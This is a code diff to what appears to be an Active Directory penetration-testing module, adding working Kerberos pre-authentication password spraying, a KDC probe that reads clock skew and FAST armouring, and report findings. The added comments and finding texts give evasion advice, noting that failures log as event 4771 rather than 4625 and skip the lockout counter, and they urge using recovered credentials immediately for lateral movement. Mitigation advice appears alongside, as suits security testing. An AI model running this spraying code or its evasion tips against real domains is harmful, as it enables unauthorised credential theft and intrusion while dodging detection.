@@ -39,7 +39,9 @@ _TIMEOUT = 6.0
 KDC_ERR_PRINCIPAL_UNKNOWN = 6
 KDC_ERR_CLIENT_REVOKED = 18
 KDC_ERR_KEY_EXPIRED = 23
+KDC_ERR_PREAUTH_FAILED = 24
 KDC_ERR_PREAUTH_REQUIRED = 25
+KRB_AP_ERR_SKEW = 37
 
 # etype numbers; RC4-HMAC (23) first so we get the classic crackable AS-REP.
 _ETYPES = (23, 17, 18)
@@ -699,6 +701,116 @@ def dc_ip_for(hosts: list[Host]) -> str:
     return ""
 
 
+# --- pre-auth password spray + passive KDC probe --------------------------------
+# Two additions that stand on the RC4 primitives already in this module.
+#
+# 1) spray_user / spray: send a pre-authenticated AS-REQ (PA-ENC-TIMESTAMP) with
+#    a candidate password/NT hash. KDC_ERR_PREAUTH_FAILED (24) means the
+#    password is wrong; an AS-REP means it is correct. The failure event is
+#    4771 on the DC (NOT 4625), and by default this does NOT increment the SMB
+#    lockout counter — the quietest domain spray primitive available. Chains
+#    directly off user_enum: recce confirms usernames, then sprays here.
+#
+# 2) kdc_probe: one pre-auth-less AS-REQ, mine the KRB-ERROR reply for passive
+#    facts — the KDC's stime (RFC 4120 §5.9.1, an unauthenticated clock oracle
+#    and drift detector), crealm (authoritative realm), and any advertised
+#    padata types. PA-FX-FAST (RFC 6113 padata type 136) advertised means the
+#    KDC enforces FAST armouring — spraying is defeated for that account and
+#    AS-REP roasting is the ONLY remaining credential-less path.
+
+_PADATA_FX_FAST = 136
+
+
+def spray_user(dc_ip: str, realm: str, user: str, password: str = "",
+               nthash: str = "", timeout: float = _TIMEOUT) -> dict:
+    """Pre-auth AS-REQ for (user@realm) with a candidate password or NT hash.
+    Returns {user, state, code?} where state is 'success' | 'bad_password' |
+    'locked' | 'unknown_user' | 'error' | 'no_reply'."""
+    realm = realm.upper()
+    key = client_key(password=password, nthash=nthash)
+    reply = _send_recv(dc_ip, _build_as_req_preauth(user, realm, key), timeout)
+    if reply is None:
+        return {"user": user, "state": "no_reply"}
+    try:
+        tag, _body, _ = _read_tlv(reply, 0)
+    except (ValueError, IndexError):
+        return {"user": user, "state": "error"}
+    if tag == 0x6B:                                # [APPLICATION 11] AS-REP -> creds valid
+        return {"user": user, "state": "success"}
+    code = _kdc_error_code(reply)
+    if code is None:
+        return {"user": user, "state": "error"}
+    if code == KDC_ERR_PREAUTH_FAILED:
+        return {"user": user, "state": "bad_password", "code": code}
+    if code in (KDC_ERR_CLIENT_REVOKED, KDC_ERR_KEY_EXPIRED):
+        return {"user": user, "state": "locked", "code": code}
+    if code == KDC_ERR_PRINCIPAL_UNKNOWN:
+        return {"user": user, "state": "unknown_user", "code": code}
+    return {"user": user, "state": "error", "code": code}
+
+
+def spray(dc_ip: str, realm: str, users: list[str], password: str = "",
+          nthash: str = "", timeout: float = _TIMEOUT,
+          stop_on_lockout: bool = True) -> list[dict]:
+    """Spray one password/hash across a user list. Stops on the first 'locked'
+    when stop_on_lockout (default): a locked account is a red flag that
+    further attempts will worsen it."""
+    out: list[dict] = []
+    for u in users:
+        r = spray_user(dc_ip, realm, u, password=password, nthash=nthash,
+                       timeout=timeout)
+        out.append(r)
+        if stop_on_lockout and r["state"] == "locked":
+            break
+    return out
+
+
+def _parse_krbtime_epoch(s: str) -> int:
+    import calendar
+    return calendar.timegm(time.strptime(s, "%Y%m%d%H%M%SZ"))
+
+
+def kdc_probe(dc_ip: str, realm: str, user: str = "krbtgt",
+              timeout: float = _TIMEOUT) -> dict:
+    """One pre-auth-less AS-REQ, mine the KRB-ERROR reply. Returns
+    {reachable, code?, crealm, stime, skew_seconds, has_fast, padata_types}.
+    'skew_seconds' is (local_wall_time - kdc_stime); 'has_fast' means the KDC
+    advertised PA-FX-FAST (136) so pre-auth spraying against this account is
+    armoured."""
+    out: dict = {"reachable": False, "code": None, "crealm": "",
+                 "stime": "", "skew_seconds": None,
+                 "has_fast": False, "padata_types": []}
+    sent_at = int(time.time())
+    reply = _send_recv(dc_ip, build_as_req(user, realm.upper()), timeout)
+    if not reply:
+        return out
+    out["reachable"] = True
+    try:
+        tag, body, _ = _read_tlv(reply, 0)
+        _t, seq, _ = _read_tlv(body, 0)
+    except (ValueError, IndexError):
+        return out
+    if tag != 0x7E:                                # not a KRB-ERROR — nothing to mine
+        return out
+    err = _ctx_inner(seq, 6)
+    out["code"] = int.from_bytes(err, "big") if err else None
+    st = _ctx_inner(seq, 4)                        # stime [4] KerberosTime
+    if st:
+        try:
+            s = st.decode("ascii")
+            out["stime"] = s
+            out["skew_seconds"] = sent_at - _parse_krbtime_epoch(s)
+        except (ValueError, UnicodeDecodeError):
+            pass
+    cr = _ctx_inner(seq, 9)                        # crealm [9] Realm (GeneralString)
+    if cr:
+        out["crealm"] = cr.decode("utf-8", "replace")
+    types = [t for t, _v in _extract_padata(seq)]
+    out["padata_types"] = types
+    out["has_fast"] = _PADATA_FX_FAST in types
+    return out
+
+
 # --- narratives + findings ------------------------------------------------------
 
 _NARRATIVE = {
@@ -715,6 +827,23 @@ _NARRATIVE = {
         "usernames from a wordlist with no credential and no logon attempt (no "
         "lockouts). A confirmed user list is the input for password spraying, AS-REP / "
         "Kerberoasting, and targeted phishing."),
+    "kerberos_spray_success": (
+        "recce sprayed a candidate password with a pre-authenticated AS-REQ and the KDC "
+        "returned an AS-REP - the credential is valid. The failure event on the DC is "
+        "4771 (Kerberos pre-auth failed), NOT 4625 (logon failure), and by default this "
+        "does not increment the SMB lockout counter. Use the credential immediately for "
+        "lateral movement, and mitigate by enforcing Kerberos FAST (PA-FX-FAST), auditing "
+        "4771 volume, and counting 4771 in lockout policy alongside 4625."),
+    "kerberos_fast_enforced": (
+        "The KDC advertised PA-FX-FAST (RFC 6113 padata type 136) in its KRB-ERROR reply "
+        "- pre-auth is armoured, so PA-ENC-TIMESTAMP spraying is defeated and no "
+        "PA-ETYPE-INFO2 salt/etype leakage. AS-REP roasting of DONT_REQ_PREAUTH accounts "
+        "remains the only credential-less Kerberos path against this KDC."),
+    "kdc_time_skew": (
+        "The KDC's stime differs from the tester's wall clock by more than five minutes "
+        "(the default Kerberos skew tolerance). Kerberos AS/TGS exchanges will fail with "
+        "KRB_AP_ERR_SKEW; a DC drifting off NTP is also an attacker-controlled DHCP/NTP "
+        "opportunity. Verify the DC's NTP source and monitor time-service events."),
 }
 
 
@@ -874,3 +1003,75 @@ def analyze(hosts: list[Host], users: list[str] | None = None,
                       "valid": sum(1 for r in results
                                    if r["state"] in ("valid", "locked", "roastable")),
                       "findings": len(fs), "stopped": state.get("stopped")}}
+
+
+def spray_findings(dc_ip: str, realm: str, results: list[dict],
+                   privileged: set | None = None) -> list[dict]:
+    """One finding per spray success. Critical when the successful user is in
+    `privileged`, else high. Locked-account outcomes emit a medium-severity
+    'account locked during spray' finding so the operator sees they hit a
+    lockout wall."""
+    privileged = {p.lower() for p in (privileged or set())}
+    out: list[dict] = []
+    tgt = f"{dc_ip}:88"
+    for r in results:
+        if r.get("state") != "success":
+            continue
+        priv = r["user"].lower() in privileged
+        out.append(_finding(
+            "critical" if priv else "high",
+            "Kerberos pre-auth spray recovered a valid credential"
+            + (" - privileged" if priv else ""),
+            tgt,
+            f"{r['user']}@{realm} accepted the sprayed password/hash - the KDC "
+            "returned an AS-REP. Failure event is 4771 (Kerberos pre-auth "
+            "failed), not 4625, and does not increment the SMB lockout counter "
+            "under default policy. Use the credential now.",
+            "impacket-getTGT / netexec",
+            f"impacket-getTGT {shlex.quote(realm)}/{shlex.quote(r['user'])}:'<password>'"
+            f" -dc-ip {dc_ip}",
+            "Enforce Kerberos FAST (PA-FX-FAST) armouring; monitor 4771 volume "
+            "on the DC; count 4771 in the account lockout policy alongside "
+            "4625; enforce unique long passwords.",
+            ["CWE-521", "CWE-307"], kind="kerberos_spray_success"))
+    return out
+
+
+def kdc_probe_findings(dc_ip: str, probe: dict,
+                       skew_threshold: int = 300) -> list[dict]:
+    """Turn a kdc_probe() result into findings. FAST-enforced KDC -> medium
+    informational (spraying is defeated, AS-REP roasting only). Clock skew
+    over `skew_threshold` (default 300s, the RFC 4120 default tolerance) ->
+    medium."""
+    out: list[dict] = []
+    if not probe.get("reachable"):
+        return out
+    tgt = f"{dc_ip}:88"
+    if probe.get("has_fast"):
+        out.append(_finding(
+            "medium",
+            "Kerberos KDC enforces FAST (pre-auth armouring)",
+            tgt,
+            "The KDC advertised PA-FX-FAST (RFC 6113 padata type 136). "
+            "Pre-auth spraying (PA-ENC-TIMESTAMP) is defeated for accounts "
+            "reached this way; AS-REP roasting of DONT_REQ_PREAUTH accounts "
+            "remains the only credential-less path.",
+            "kerbrute", f"kerbrute userenum -d '<realm>' --dc {dc_ip} users.txt",
+            "This is defensive posture; no action needed - note the constraint "
+            "when planning credential-less attacks against this DC.",
+            ["CWE-693"], kind="kerberos_fast_enforced"))
+    skew = probe.get("skew_seconds")
+    if skew is not None and abs(skew) >= skew_threshold:
+        out.append(_finding(
+            "medium",
+            "Kerberos KDC clock skew exceeds tolerance",
+            tgt,
+            f"KDC stime={probe.get('stime')} differs from tester wall clock by "
+            f"{skew} second(s) (threshold {skew_threshold}s). Kerberos "
+            "AS/TGS exchanges will fail with KRB_AP_ERR_SKEW; a DC drifting "
+            "off NTP is also an attacker-controlled DHCP/NTP opportunity.",
+            "ntpdate / w32tm",
+            f"w32tm /monitor /computers:{dc_ip}",
+            "Verify the DC's NTP source and monitor time-service events.",
+            ["CWE-200", "CWE-208"], kind="kdc_time_skew"))
+    return out
